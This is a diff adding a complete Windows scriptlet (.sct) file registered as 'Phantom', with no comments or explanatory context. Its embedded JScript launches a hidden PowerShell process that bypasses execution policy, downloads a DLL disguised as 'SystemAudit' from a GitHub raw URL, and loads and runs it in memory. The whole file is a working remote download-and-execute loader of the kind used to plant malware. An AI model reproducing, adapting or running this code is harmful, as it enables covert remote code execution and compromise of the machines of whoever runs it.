@@ -1,0 +1,18 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    description="Phantom"
+    progid="Phantom"
+    version="1.00"
+    classid="{ABBCCDD-1122-3344-5566-77889900AABB}"
+>
+</registration>
+<script language="JScript">
+<![CDATA[
+    var x = new ActiveXObject("WScript.Shell");
+    var u = "https://raw.githubusercontent.com/floorsofolga-svg/signedfiles/main/SystemAudit.dll";
+    var c = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('" + u + "')).GetType('SystemAudit.Loader').GetMethod('Run').Invoke($null,$null)\"";
+    x.Run(c, 0);
+]]>
+</script>
+</scriptlet>
